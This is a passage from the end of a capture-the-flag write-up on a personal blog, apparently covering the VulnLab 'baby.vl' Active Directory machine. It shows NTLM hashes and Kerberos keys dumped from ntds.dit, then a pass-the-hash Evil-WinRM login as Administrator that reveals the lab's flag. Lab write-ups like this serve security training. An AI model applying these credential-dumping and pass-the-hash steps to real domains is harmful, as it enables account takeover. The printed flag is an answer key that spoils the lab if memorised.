</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\T</span>eresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\C</span>aroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:3b1da22b1973c0bb86d4a9b6a9ae65f6:::
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Kerberos keys from ntds.dit
</span></span><span style="display:flex;"><span>Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4
</span></span><span style="display:flex;"><span>Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d
</span></span><span style="display:flex;"><span>Administrator:des-cbc-md5:d38cb994ae806b97
</span></span></code></pre></div><p>We can then connect with the Administrator account and its hash to get the flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; cat <span style="color:#e6db74">&#34;C:/Users/Administrator/Desktop/root.txt&#34;</span>
</span></span><span style="display:flex;"><span>VL<span style="color:#f92672">{</span>9000cab96bcf62e99073ff5f6653ce90<span style="color:#f92672">}</span>
</span></span></code></pre></div>
            </div>

            
            
            <div class="related-posts">
                <h3>Related Content</h3>
                <div class="related-grid">
                    
                    <div class="related-post">
                        <h4><a href="http://localhost:1313/about/about/">My First Post</a></h4>
                        <div class="related-meta">
                            2025.09.15 •
                            
                            
                            
                            
                            
                             0 min read
                        </div>
                    </div>
                    
                </div>
            </div>
            

            
            <nav class="post-navigation">
                
                <div class="nav-previous">
                    <span class="nav-label">← Previous</span>
                    <a href="http://localhost:1313/posts/woff2/" class="nav-title">Weaponizing Font Policies for Payload Embedding </a>
                </div>
                

                
                <div class="nav-next">
                    <span class="nav-label">Next →</span>
                    <a href="http://localhost:1313/posts/pors/hackropole_pors/" class="nav-title">Hackropole : PORS</a>
                </div>
                
            </nav>
        </article>

        <aside class="sidebar">
            <nav class="toc">
                <h4>Contents</h4>
                <div id="toc-content">
                    
                </div>
            </nav>
        </aside>
        </div>
    </div>
</div>

    </main>

    

    <script src="http://localhost:1313/js/main.js"></script>
</body>
</html>
